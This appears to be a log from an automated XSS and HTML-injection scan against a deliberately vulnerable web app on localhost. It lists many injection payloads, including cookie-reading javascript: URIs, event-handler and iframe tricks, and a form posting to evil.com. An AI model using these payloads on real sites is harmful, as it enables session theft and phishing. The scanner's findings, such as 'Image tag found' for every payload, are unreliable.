+2025-08-05 14:11:17.686578 |     [!] HTTP 404 with payload 'new Function('alert(1)')()' (URL fragment)
+2025-08-05 14:11:17.686578 |   - Testing parameter payload: new Function('alert(1)')()
+2025-08-05 14:11:17.688735 |     [!] HTTP 404 with payload 'new Function('alert(1)')()' (URL parameter)
+2025-08-05 14:11:17.688735 |   - Testing fragment payload: onerror=alert;throw 1
+2025-08-05 14:11:17.690736 |     [!] HTTP 404 with payload 'onerror=alert;throw 1' (URL fragment)
+2025-08-05 14:11:17.690736 |   - Testing parameter payload: onerror=alert;throw 1
+2025-08-05 14:11:17.692738 |     [!] HTTP 404 with payload 'onerror=alert;throw 1' (URL parameter)
+2025-08-05 14:11:17.692738 |   - Testing fragment payload: onload=alert(1)
+2025-08-05 14:11:17.693736 |     [!] HTTP 404 with payload 'onload=alert(1)' (URL fragment)
+2025-08-05 14:11:17.694737 |   - Testing parameter payload: onload=alert(1)
+2025-08-05 14:11:17.695772 |     [!] HTTP 404 with payload 'onload=alert(1)' (URL parameter)
+2025-08-05 14:11:17.696930 |   - Testing fragment payload: onmouseover=alert(1)
+2025-08-05 14:11:17.697940 |     [!] HTTP 404 with payload 'onmouseover=alert(1)' (URL fragment)
+2025-08-05 14:11:17.697940 |   - Testing parameter payload: onmouseover=alert(1)
+2025-08-05 14:11:17.699941 |     [!] HTTP 404 with payload 'onmouseover=alert(1)' (URL parameter)
+2025-08-05 14:11:17.699941 |   - Testing fragment payload: data:text/javascript,alert(1)
+2025-08-05 14:11:17.701946 |     [!] HTTP 404 with payload 'data:text/javascript,alert(1)' (URL fragment)
+2025-08-05 14:11:17.701946 |   - Testing parameter payload: data:text/javascript,alert(1)
+2025-08-05 14:11:17.703456 |     [!] HTTP 404 with payload 'data:text/javascript,alert(1)' (URL parameter)
+2025-08-05 14:11:17.703456 |   - Testing fragment payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:11:17.705463 |     [!] HTTP 404 with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL fragment)
+2025-08-05 14:11:17.705463 |   - Testing parameter payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:11:17.707614 |     [!] HTTP 404 with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL parameter)
+2025-08-05 14:11:17.707614 |   - Testing fragment payload: vbscript:msgbox(1)
+2025-08-05 14:11:17.709686 |     [!] HTTP 404 with payload 'vbscript:msgbox(1)' (URL fragment)
+2025-08-05 14:11:17.709686 |   - Testing parameter payload: vbscript:msgbox(1)
+2025-08-05 14:11:17.711695 |     [!] HTTP 404 with payload 'vbscript:msgbox(1)' (URL parameter)
+2025-08-05 14:11:17.711695 |   - Testing fragment payload: livescript:alert(1)
+2025-08-05 14:11:17.713697 |     [!] HTTP 404 with payload 'livescript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.713697 |   - Testing parameter payload: livescript:alert(1)
+2025-08-05 14:11:17.714697 |     [!] HTTP 404 with payload 'livescript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.716093 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/sqli/
+2025-08-05 14:11:17.725410 |   - No obvious JS sinks found in page source
+2025-08-05 14:11:17.725410 |   - Testing fragment payload: javascript:alert(1)
+2025-08-05 14:11:17.728619 |     [!] Possible JS injection - script error with payload 'javascript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.728619 |   - Testing parameter payload: javascript:alert(1)
+2025-08-05 14:11:17.733096 |     [!] Possible JS injection - script error with payload 'javascript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.733096 |   - Testing fragment payload: javascript:alert(document.cookie)
+2025-08-05 14:11:17.737096 |     [!] Possible JS injection - script error with payload 'javascript:alert(document.cookie)' (URL fragment)
+2025-08-05 14:11:17.737096 |   - Testing parameter payload: javascript:alert(document.cookie)
+2025-08-05 14:11:17.740752 |     [!] Possible JS injection - script error with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:11:17.741752 |   - Testing fragment payload: javascript:prompt(1)
+2025-08-05 14:11:17.744609 |     [!] Possible JS injection - script error with payload 'javascript:prompt(1)' (URL fragment)
+2025-08-05 14:11:17.745612 |   - Testing parameter payload: javascript:prompt(1)
+2025-08-05 14:11:17.748680 |     [!] Possible JS injection - script error with payload 'javascript:prompt(1)' (URL parameter)
+2025-08-05 14:11:17.748680 |   - Testing fragment payload: javascript:confirm(1)
+2025-08-05 14:11:17.752963 |     [!] Possible JS injection - script error with payload 'javascript:confirm(1)' (URL fragment)
+2025-08-05 14:11:17.752963 |   - Testing parameter payload: javascript:confirm(1)
+2025-08-05 14:11:17.756637 |     [!] Possible JS injection - script error with payload 'javascript:confirm(1)' (URL parameter)
+2025-08-05 14:11:17.756637 |   - Testing fragment payload: alert(1)
+2025-08-05 14:11:17.760791 |     [!] Possible JS injection - script error with payload 'alert(1)' (URL fragment)
+2025-08-05 14:11:17.760791 |   - Testing parameter payload: alert(1)
+2025-08-05 14:11:17.763791 |     [!] Possible JS injection - script error with payload 'alert(1)' (URL parameter)
+2025-08-05 14:11:17.763791 |   - Testing fragment payload: confirm(1)
+2025-08-05 14:11:17.768075 |     [!] Possible JS injection - script error with payload 'confirm(1)' (URL fragment)
+2025-08-05 14:11:17.768075 |   - Testing parameter payload: confirm(1)
+2025-08-05 14:11:17.771277 |     [!] Possible JS injection - script error with payload 'confirm(1)' (URL parameter)
+2025-08-05 14:11:17.772422 |   - Testing fragment payload: prompt(1)
+2025-08-05 14:11:17.775421 |     [!] Possible JS injection - script error with payload 'prompt(1)' (URL fragment)
+2025-08-05 14:11:17.775421 |   - Testing parameter payload: prompt(1)
+2025-08-05 14:11:17.779868 |     [!] Possible JS injection - script error with payload 'prompt(1)' (URL parameter)
+2025-08-05 14:11:17.779868 |   - Testing fragment payload: jav&#x61;script:alert(1)
+2025-08-05 14:11:17.783190 |     [!] Possible JS injection - script error with payload 'jav&#x61;script:alert(1)' (URL fragment)
+2025-08-05 14:11:17.783190 |   - Testing parameter payload: jav&#x61;script:alert(1)
+2025-08-05 14:11:17.787785 |     [!] Possible JS injection - script error with payload 'jav&#x61;script:alert(1)' (URL parameter)
+2025-08-05 14:11:17.787785 |   - Testing fragment payload: jav%0ascript:alert(1)
+2025-08-05 14:11:17.791833 |     [!] Possible JS injection - script error with payload 'jav%0ascript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.793006 |   - Testing parameter payload: jav%0ascript:alert(1)
+2025-08-05 14:11:17.797318 |     [!] Possible JS injection - script error with payload 'jav%0ascript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.797839 |   - Testing fragment payload: javascript&#58;alert(1)
+2025-08-05 14:11:17.802016 |     [!] Possible JS injection - script error with payload 'javascript&#58;alert(1)' (URL fragment)
+2025-08-05 14:11:17.802016 |   - Testing parameter payload: javascript&#58;alert(1)
+2025-08-05 14:11:17.806366 |     [!] Possible JS injection - script error with payload 'javascript&#58;alert(1)' (URL parameter)
+2025-08-05 14:11:17.806366 |   - Testing fragment payload: eval('alert(1)')
+2025-08-05 14:11:17.810477 |     [!] Possible JS injection - script error with payload 'eval('alert(1)')' (URL fragment)
+2025-08-05 14:11:17.810477 |   - Testing parameter payload: eval('alert(1)')
+2025-08-05 14:11:17.813907 |     [!] Possible JS injection - script error with payload 'eval('alert(1)')' (URL parameter)
+2025-08-05 14:11:17.814905 |   - Testing fragment payload: setTimeout('alert(1)',0)
+2025-08-05 14:11:17.818365 |     [!] Possible JS injection - script error with payload 'setTimeout('alert(1)',0)' (URL fragment)
+2025-08-05 14:11:17.818365 |   - Testing parameter payload: setTimeout('alert(1)',0)
+2025-08-05 14:11:17.822443 |     [!] Possible JS injection - script error with payload 'setTimeout('alert(1)',0)' (URL parameter)
+2025-08-05 14:11:17.822443 |   - Testing fragment payload: setInterval('alert(1)',1000)
+2025-08-05 14:11:17.825702 |     [!] Possible JS injection - script error with payload 'setInterval('alert(1)',1000)' (URL fragment)
+2025-08-05 14:11:17.825702 |   - Testing parameter payload: setInterval('alert(1)',1000)
+2025-08-05 14:11:17.830322 |     [!] Possible JS injection - script error with payload 'setInterval('alert(1)',1000)' (URL parameter)
+2025-08-05 14:11:17.830322 |   - Testing fragment payload: Function('alert(1)')()
+2025-08-05 14:11:17.833326 |     [!] Possible JS injection - script error with payload 'Function('alert(1)')()' (URL fragment)
+2025-08-05 14:11:17.834626 |   - Testing parameter payload: Function('alert(1)')()
+2025-08-05 14:11:17.837329 |     [!] Possible JS injection - script error with payload 'Function('alert(1)')()' (URL parameter)
+2025-08-05 14:11:17.837329 |   - Testing fragment payload: new Function('alert(1)')()
+2025-08-05 14:11:17.841193 |     [!] Possible JS injection - script error with payload 'new Function('alert(1)')()' (URL fragment)
+2025-08-05 14:11:17.841193 |   - Testing parameter payload: new Function('alert(1)')()
+2025-08-05 14:11:17.844635 |     [!] Possible JS injection - script error with payload 'new Function('alert(1)')()' (URL parameter)
+2025-08-05 14:11:17.845780 |   - Testing fragment payload: onerror=alert;throw 1
+2025-08-05 14:11:17.849353 |     [!] Possible JS injection - script error with payload 'onerror=alert;throw 1' (URL fragment)
+2025-08-05 14:11:17.849353 |   - Testing parameter payload: onerror=alert;throw 1
+2025-08-05 14:11:17.852520 |     [!] Possible JS injection - script error with payload 'onerror=alert;throw 1' (URL parameter)
+2025-08-05 14:11:17.852520 |   - Testing fragment payload: onload=alert(1)
+2025-08-05 14:11:17.856147 |     [!] Possible JS injection - script error with payload 'onload=alert(1)' (URL fragment)
+2025-08-05 14:11:17.857147 |   - Testing parameter payload: onload=alert(1)
+2025-08-05 14:11:17.860145 |     [!] Possible JS injection - script error with payload 'onload=alert(1)' (URL parameter)
+2025-08-05 14:11:17.860145 |   - Testing fragment payload: onmouseover=alert(1)
+2025-08-05 14:11:17.863849 |     [!] Possible JS injection - script error with payload 'onmouseover=alert(1)' (URL fragment)
+2025-08-05 14:11:17.863849 |   - Testing parameter payload: onmouseover=alert(1)
+2025-08-05 14:11:17.868121 |     [!] Possible JS injection - script error with payload 'onmouseover=alert(1)' (URL parameter)
+2025-08-05 14:11:17.868121 |   - Testing fragment payload: data:text/javascript,alert(1)
+2025-08-05 14:11:17.872119 |     [!] Possible JS injection - script error with payload 'data:text/javascript,alert(1)' (URL fragment)
+2025-08-05 14:11:17.872119 |   - Testing parameter payload: data:text/javascript,alert(1)
+2025-08-05 14:11:17.875844 |     [!] Possible JS injection - script error with payload 'data:text/javascript,alert(1)' (URL parameter)
+2025-08-05 14:11:17.875844 |   - Testing fragment payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:11:17.878992 |     [!] Possible JS injection - script error with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL fragment)
+2025-08-05 14:11:17.880001 |   - Testing parameter payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:11:17.883002 |     [!] Possible JS injection - script error with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL parameter)
+2025-08-05 14:11:17.884001 |   - Testing fragment payload: vbscript:msgbox(1)
+2025-08-05 14:11:17.887002 |     [!] Possible JS injection - script error with payload 'vbscript:msgbox(1)' (URL fragment)
+2025-08-05 14:11:17.887002 |   - Testing parameter payload: vbscript:msgbox(1)
+2025-08-05 14:11:17.890735 |     [!] Possible JS injection - script error with payload 'vbscript:msgbox(1)' (URL parameter)
+2025-08-05 14:11:17.892098 |   - Testing fragment payload: livescript:alert(1)
+2025-08-05 14:11:17.894561 |     [!] Possible JS injection - script error with payload 'livescript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.895561 |   - Testing parameter payload: livescript:alert(1)
+2025-08-05 14:11:17.898880 |     [!] Possible JS injection - script error with payload 'livescript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.905476 |     [!] Possible JS injection - script error with payload 'javascript:alert(1)' (form parameter id)
+2025-08-05 14:11:17.907970 |     [!] Possible JS injection - script error with payload 'javascript:alert(document.cookie)' (form parameter id)
+2025-08-05 14:11:17.911601 |     [!] Possible JS injection - script error with payload 'javascript:prompt(1)' (form parameter id)
+2025-08-05 14:11:17.915974 |     [!] Possible JS injection - script error with payload 'javascript:confirm(1)' (form parameter id)
+2025-08-05 14:11:17.919023 |     [!] Possible JS injection - script error with payload 'alert(1)' (form parameter id)
+2025-08-05 14:11:17.922814 |     [!] Possible JS injection - script error with payload 'javascript:alert(1)' (form parameter Submit)
+2025-08-05 14:11:17.927383 |     [!] Possible JS injection - script error with payload 'javascript:alert(document.cookie)' (form parameter Submit)
+2025-08-05 14:11:17.931559 |     [!] Possible JS injection - script error with payload 'javascript:prompt(1)' (form parameter Submit)
+2025-08-05 14:11:17.934818 |     [!] Possible JS injection - script error with payload 'javascript:confirm(1)' (form parameter Submit)
+2025-08-05 14:11:17.938818 |     [!] Possible JS injection - script error with payload 'alert(1)' (form parameter Submit)
+2025-08-05 14:11:17.939324 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/exec/
+2025-08-05 14:11:17.944558 |   - No obvious JS sinks found in page source
+2025-08-05 14:11:17.944558 |   - Testing fragment payload: javascript:alert(1)
+2025-08-05 14:11:17.953232 |     [!] Possible JS injection - script error with payload 'javascript:alert(1)' (URL fragment)
+2025-08-05 14:11:17.953232 |   - Testing parameter payload: javascript:alert(1)
+2025-08-05 14:11:17.956391 |     [!] Possible JS injection - script error with payload 'javascript:alert(1)' (URL parameter)
+2025-08-05 14:11:17.956391 |   - Testing fragment payload: javascript:alert(document.cookie)
+2025-08-05 14:11:17.960227 |     [!] Possible JS injection - script error with payload 'javascript:alert(document.cookie)' (URL fragment)
+2025-08-05 14:11:17.960227 |   - Testing parameter payload: javascript:alert(document.cookie)
+2025-08-05 14:11:17.963375 |     [!] Possible JS injection - script error with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:11:17.964374 |   - Testing fragment payload: javascript:prompt(1)
+2025-08-05 14:11:17.966636 |     [!] Possible JS injection - script error with payload 'javascript:prompt(1)' (URL fragment)
+2025-08-05 14:11:17.967961 |   - Testing parameter payload: javascript:prompt(1)
+2025-08-05 14:11:17.970960 |     [!] Possible JS injection - script error with payload 'javascript:prompt(1)' (URL parameter)
+2025-08-05 14:11:17.970960 |   - Testing fragment payload: javascript:confirm(1)
+2025-08-05 14:11:17.974913 |     [!] Possible JS injection - script error with payload 'javascript:confirm(1)' (URL fragment)
+2025-08-05 14:11:17.974913 |   - Testing parameter payload: javascript:confirm(1)
+2025-08-05 14:11:17.978339 |     [!] Possible JS injection - script error with payload 'javascript:confirm(1)' (URL parameter)
+2025-08-05 14:11:17.978339 |   - Testing fragment payload: alert(1)
+2025-08-05 14:11:17.981542 |     [!] Possible JS injection - script error with payload 'alert(1)' (URL fragment)
+2025-08-05 14:11:17.981542 |   - Testing parameter payload: alert(1)
+2025-08-05 14:11:17.984697 |     [!] Possible JS injection - script error with payload 'alert(1)' (URL parameter)
+2025-08-05 14:11:17.985695 |   - Testing fragment payload: confirm(1)
+2025-08-05 14:11:17.988970 |     [!] Possible JS injection - script error with payload 'confirm(1)' (URL fragment)
+2025-08-05 14:11:17.988970 |   - Testing parameter payload: confirm(1)
+2025-08-05 14:11:17.992970 |     [!] Possible JS injection - script error with payload 'confirm(1)' (URL parameter)
+2025-08-05 14:11:17.992970 |   - Testing fragment payload: prompt(1)
+2025-08-05 14:11:17.996198 |     [!] Possible JS injection - script error with payload 'prompt(1)' (URL fragment)
+2025-08-05 14:11:17.997198 |   - Testing parameter payload: prompt(1)
+2025-08-05 14:11:17.999197 |     [!] Possible JS injection - script error with payload 'prompt(1)' (URL parameter)
+2025-08-05 14:11:17.999197 |   - Testing fragment payload: jav&#x61;script:alert(1)
+2025-08-05 14:11:18.002677 |     [!] Possible JS injection - script error with payload 'jav&#x61;script:alert(1)' (URL fragment)
+2025-08-05 14:11:18.003677 |   - Testing parameter payload: jav&#x61;script:alert(1)
+2025-08-05 14:11:18.006989 |     [!] Possible JS injection - script error with payload 'jav&#x61;script:alert(1)' (URL parameter)
+2025-08-05 14:11:18.006989 |   - Testing fragment payload: jav%0ascript:alert(1)
+2025-08-05 14:11:18.010483 |     [!] Possible JS injection - script error with payload 'jav%0ascript:alert(1)' (URL fragment)
+2025-08-05 14:11:18.010483 |   - Testing parameter payload: jav%0ascript:alert(1)
+2025-08-05 14:11:18.013482 |     [!] Possible JS injection - script error with payload 'jav%0ascript:alert(1)' (URL parameter)
+2025-08-05 14:11:18.013482 |   - Testing fragment payload: javascript&#58;alert(1)
+2025-08-05 14:11:18.017923 |     [!] Possible JS injection - script error with payload 'javascript&#58;alert(1)' (URL fragment)
+2025-08-05 14:11:18.017923 |   - Testing parameter payload: javascript&#58;alert(1)
+2025-08-05 14:11:18.021925 |     [!] Possible JS injection - script error with payload 'javascript&#58;alert(1)' (URL parameter)
+2025-08-05 14:11:18.021925 |   - Testing fragment payload: eval('alert(1)')
+2025-08-05 14:11:18.024929 |     [!] Possible JS injection - script error with payload 'eval('alert(1)')' (URL fragment)
+2025-08-05 14:11:18.024929 |   - Testing parameter payload: eval('alert(1)')
+2025-08-05 14:11:18.028103 |     [!] Possible JS injection - script error with payload 'eval('alert(1)')' (URL parameter)
+2025-08-05 14:11:18.029132 |   - Testing fragment payload: setTimeout('alert(1)',0)
+2025-08-05 14:11:18.032131 |     [!] Possible JS injection - script error with payload 'setTimeout('alert(1)',0)' (URL fragment)
+2025-08-05 14:11:18.032131 |   - Testing parameter payload: setTimeout('alert(1)',0)
+2025-08-05 14:11:18.035559 |     [!] Possible JS injection - script error with payload 'setTimeout('alert(1)',0)' (URL parameter)
+2025-08-05 14:11:18.035559 |   - Testing fragment payload: setInterval('alert(1)',1000)
+2025-08-05 14:11:18.038716 |     [!] Possible JS injection - script error with payload 'setInterval('alert(1)',1000)' (URL fragment)
+2025-08-05 14:11:18.038716 |   - Testing parameter payload: setInterval('alert(1)',1000)
+2025-08-05 14:11:18.043571 |     [!] Possible JS injection - script error with payload 'setInterval('alert(1)',1000)' (URL parameter)
+2025-08-05 14:11:18.043571 |   - Testing fragment payload: Function('alert(1)')()
+2025-08-05 14:11:18.046076 |     [!] Possible JS injection - script error with payload 'Function('alert(1)')()' (URL fragment)
+2025-08-05 14:11:18.047081 |   - Testing parameter payload: Function('alert(1)')()
+2025-08-05 14:11:18.050213 |     [!] Possible JS injection - script error with payload 'Function('alert(1)')()' (URL parameter)
+2025-08-05 14:11:18.050813 |   - Testing fragment payload: new Function('alert(1)')()
+2025-08-05 14:11:18.053891 |     [!] Possible JS injection - script error with payload 'new Function('alert(1)')()' (URL fragment)
+2025-08-05 14:11:18.054404 |   - Testing parameter payload: new Function('alert(1)')()
+2025-08-05 14:11:18.057520 |     [!] Possible JS injection - script error with payload 'new Function('alert(1)')()' (URL parameter)
+2025-08-05 14:11:18.058041 |   - Testing fragment payload: onerror=alert;throw 1
+2025-08-05 14:11:18.061261 |     [!] Possible JS injection - script error with payload 'onerror=alert;throw 1' (URL fragment)
+2025-08-05 14:11:18.061261 |   - Testing parameter payload: onerror=alert;throw 1
+2025-08-05 14:11:18.064821 |     [!] Possible JS injection - script error with payload 'onerror=alert;throw 1' (URL parameter)
+2025-08-05 14:11:18.064821 |   - Testing fragment payload: onload=alert(1)
+2025-08-05 14:11:18.067833 |     [!] Possible JS injection - script error with payload 'onload=alert(1)' (URL fragment)
+2025-08-05 14:11:18.067833 |   - Testing parameter payload: onload=alert(1)
+2025-08-05 14:11:18.071002 |     [!] Possible JS injection - script error with payload 'onload=alert(1)' (URL parameter)
+2025-08-05 14:11:18.072432 |   - Testing fragment payload: onmouseover=alert(1)
+2025-08-05 14:11:18.074441 |     [!] Possible JS injection - script error with payload 'onmouseover=alert(1)' (URL fragment)
+2025-08-05 14:11:18.075441 |   - Testing parameter payload: onmouseover=alert(1)
+2025-08-05 14:11:18.077683 |     [!] Possible JS injection - script error with payload 'onmouseover=alert(1)' (URL parameter)
+2025-08-05 14:11:18.079128 |   - Testing fragment payload: data:text/javascript,alert(1)
+2025-08-05 14:11:18.081306 |     [!] Possible JS injection - script error with payload 'data:text/javascript,alert(1)' (URL fragment)
+2025-08-05 14:11:18.081306 |   - Testing parameter payload: data:text/javascript,alert(1)
+2025-08-05 14:11:18.085052 |     [!] Possible JS injection - script error with payload 'data:text/javascript,alert(1)' (URL parameter)
+2025-08-05 14:11:18.086051 |   - Testing fragment payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:11:18.089052 |     [!] Possible JS injection - script error with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL fragment)
+2025-08-05 14:11:18.089052 |   - Testing parameter payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+2025-08-05 14:11:18.093190 |     [!] Possible JS injection - script error with payload 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' (URL parameter)
+2025-08-05 14:11:18.093190 |   - Testing fragment payload: vbscript:msgbox(1)
+2025-08-05 14:11:18.096190 |     [!] Possible JS injection - script error with payload 'vbscript:msgbox(1)' (URL fragment)
+2025-08-05 14:11:18.096190 |   - Testing parameter payload: vbscript:msgbox(1)
+2025-08-05 14:11:18.099797 |     [!] Possible JS injection - script error with payload 'vbscript:msgbox(1)' (URL parameter)
+2025-08-05 14:11:18.101263 |   - Testing fragment payload: livescript:alert(1)
+2025-08-05 14:11:18.104449 |     [!] Possible JS injection - script error with payload 'livescript:alert(1)' (URL fragment)
+2025-08-05 14:11:18.104449 |   - Testing parameter payload: livescript:alert(1)
+2025-08-05 14:11:18.108084 |     [!] Possible JS injection - script error with payload 'livescript:alert(1)' (URL parameter)
+2025-08-05 14:11:18.160103 |     [!] Possible JS injection - script error with payload 'javascript:alert(1)' (form parameter ip)
+2025-08-05 14:11:18.208411 |     [!] Possible JS injection - script error with payload 'javascript:alert(document.cookie)' (form parameter ip)
+2025-08-05 14:11:18.261212 |     [!] Possible JS injection - script error with payload 'javascript:prompt(1)' (form parameter ip)
+2025-08-05 14:11:18.309549 |     [!] Possible JS injection - script error with payload 'javascript:confirm(1)' (form parameter ip)
+2025-08-05 14:11:18.356699 |     [!] Possible JS injection - script error with payload 'alert(1)' (form parameter ip)
+2025-08-05 14:11:18.420123 |     [!] Possible JS injection - script error with payload 'javascript:alert(1)' (form parameter Submit)
+2025-08-05 14:11:18.477645 |     [!] Possible JS injection - script error with payload 'javascript:alert(document.cookie)' (form parameter Submit)
+2025-08-05 14:11:18.534631 |     [!] Possible JS injection - script error with payload 'javascript:prompt(1)' (form parameter Submit)
+2025-08-05 14:11:18.591480 |     [!] Possible JS injection - script error with payload 'javascript:confirm(1)' (form parameter Submit)
+2025-08-05 14:11:18.647548 |     [!] Possible JS injection - script error with payload 'alert(1)' (form parameter Submit)
+2025-08-05 14:11:18.647548 | ----- OTG-CLIENT-002 Test Completed -----
+
+2025-08-05 14:19:09.548680 | [+] Login successful (Status: 200)
+2025-08-05 14:19:09.603661 | [+] Security level set to low
+2025-08-05 14:19:09.603661 | ----- Starting OTG-CLIENT-003 (HTML Injection) -----
+2025-08-05 14:19:09.604670 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/xss_r/
+2025-08-05 14:19:09.608403 |   - No obvious HTML sinks found in page source
+2025-08-05 14:19:09.609400 |   - Testing payload: <h1>HTML Injection Test</h1>
+2025-08-05 14:19:09.612574 |     [✓] Image tag found with payload '<h1>HTML Injection Test</h1>' (URL parameter)
+2025-08-05 14:19:09.613758 |   - Testing payload: <b>Bold Text</b>
+2025-08-05 14:19:09.616860 |     [✓] Image tag found with payload '<b>Bold Text</b>' (URL parameter)
+2025-08-05 14:19:09.618320 |   - Testing payload: <i>Italic Text</i>
+2025-08-05 14:19:09.621325 |     [✓] Image tag found with payload '<i>Italic Text</i>' (URL parameter)
+2025-08-05 14:19:09.621325 |   - Testing payload: <img src='x' onerror='alert(1)'>
+2025-08-05 14:19:09.625533 |     [✓] Image tag found with payload '<img src='x' onerror='alert(1)'>' (URL parameter)
+2025-08-05 14:19:09.625533 |   - Testing payload: <img src=x onerror=alert(1)>
+2025-08-05 14:19:09.628729 |     [✓] Image tag found with payload '<img src=x onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.629725 |   - Testing payload: <img src=x oneonerror=alert(1)>
+2025-08-05 14:19:09.632248 |     [✓] Image tag found with payload '<img src=x oneonerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.633416 |   - Testing payload: <iframe src='javascript:alert(1)'>
+2025-08-05 14:19:09.636711 |     [✓] Image tag found with payload '<iframe src='javascript:alert(1)'>' (URL parameter)
+2025-08-05 14:19:09.637714 |   - Testing payload: <iframe src='data:text/html,<script>alert(1)</script>'>
+2025-08-05 14:19:09.641842 |     [✓] Image tag found with payload '<iframe src='data:text/html,<script>alert(1)</script>'>' (URL parameter)
+2025-08-05 14:19:09.641842 |   - Testing payload: <svg onload=alert(1)>
+2025-08-05 14:19:09.645843 |     [✓] Image tag found with payload '<svg onload=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.646847 |   - Testing payload: <svg/onload=alert(1)>
+2025-08-05 14:19:09.650599 |     [✓] Image tag found with payload '<svg/onload=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.651636 |   - Testing payload: <a href='javascript:alert(1)'>Click</a>
+2025-08-05 14:19:09.655233 |     [✓] Image tag found with payload '<a href='javascript:alert(1)'>Click</a>' (URL parameter)
+2025-08-05 14:19:09.655233 |   - Testing payload: <a href='data:text/html,<script>alert(1)</script>'>Click</a>
+2025-08-05 14:19:09.659927 |     [✓] Image tag found with payload '<a href='data:text/html,<script>alert(1)</script>'>Click</a>' (URL parameter)
+2025-08-05 14:19:09.659927 |   - Testing payload: <form action='http://evil.com'><input type='submit'></form>
+2025-08-05 14:19:09.663596 |     [✓] Image tag found with payload '<form action='http://evil.com'><input type='submit'></form>' (URL parameter)
+2025-08-05 14:19:09.663596 |   - Testing payload: <form><input name='user'><input type='submit'></form>
+2025-08-05 14:19:09.668908 |     [✓] Image tag found with payload '<form><input name='user'><input type='submit'></form>' (URL parameter)
+2025-08-05 14:19:09.670303 |   - Testing payload: <input type='text' onfocus=alert(1) autofocus>
+2025-08-05 14:19:09.673311 |     [✓] Image tag found with payload '<input type='text' onfocus=alert(1) autofocus>' (URL parameter)
+2025-08-05 14:19:09.673311 |   - Testing payload: <input type='text' onmouseover=alert(1)>
+2025-08-05 14:19:09.676735 |     [✓] Image tag found with payload '<input type='text' onmouseover=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.677795 |   - Testing payload: <div style='color:red'>Red Text</div>
+2025-08-05 14:19:09.680794 |     [✓] Image tag found with payload '<div style='color:red'>Red Text</div>' (URL parameter)
+2025-08-05 14:19:09.680794 |   - Testing payload: <div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red;z-index:9999'></div>
+2025-08-05 14:19:09.684795 |     [✓] Image tag found with payload '<div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red;z-index:9999'></div>' (URL parameter)
+2025-08-05 14:19:09.684795 |   - Testing payload: <meta http-equiv='refresh' content='0;url=javascript:alert(1)'>
+2025-08-05 14:19:09.688493 |     [✓] Image tag found with payload '<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>' (URL parameter)
+2025-08-05 14:19:09.688493 |   - Testing payload: <ImG sRc=x oNeRrOr=alert(1)>
+2025-08-05 14:19:09.691673 |     [✓] Image tag found with payload '<ImG sRc=x oNeRrOr=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.691673 |   - Testing payload: < img src=x onerror=alert(1)>
+2025-08-05 14:19:09.695181 |     [✓] Image tag found with payload '< img src=x onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.695181 |   - Testing payload: <img/src='x'/onerror=alert(1)>
+2025-08-05 14:19:09.698532 |     [✓] Image tag found with payload '<img/src='x'/onerror=alert(1)>' (URL parameter)
+2025-08-05 14:19:09.705529 |     [✓] Image tag found with payload '<h1>HTML Injection Test</h1>' (form parameter name)
+2025-08-05 14:19:09.707677 |     [✓] Image tag found with payload '<b>Bold Text</b>' (form parameter name)
+2025-08-05 14:19:09.711757 |     [✓] Image tag found with payload '<i>Italic Text</i>' (form parameter name)
+2025-08-05 14:19:09.715037 |     [✓] Image tag found with payload '<img src='x' onerror='alert(1)'>' (form parameter name)
+2025-08-05 14:19:09.719199 |     [✓] Image tag found with payload '<img src=x onerror=alert(1)>' (form parameter name)
+2025-08-05 14:19:09.719199 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/xss_s/
+2025-08-05 14:19:09.723198 |   - No obvious HTML sinks found in page source
+2025-08-05 14:19:09.723198 |   - Testing payload: <h1>HTML Injection Test</h1>
+2025-08-05 14:19:09.727393 |     [✓] Image tag found with payload '<h1>HTML Injection Test</h1>' (URL parameter)
+2025-08-05 14:19:09.727393 |   - Testing payload: <b>Bold Text</b>
+2025-08-05 14:19:09.729561 |     [✓] Image tag found with payload '<b>Bold Text</b>' (URL parameter)
+2025-08-05 14:19:09.731111 |   - Testing payload: <i>Italic Text</i>
+2025-08-05 14:19:09.734215 |     [✓] Image tag found with payload '<i>Italic Text</i>' (URL parameter)
+2025-08-05 14:19:09.735213 |   - Testing payload: <img src='x' onerror='alert(1)'>
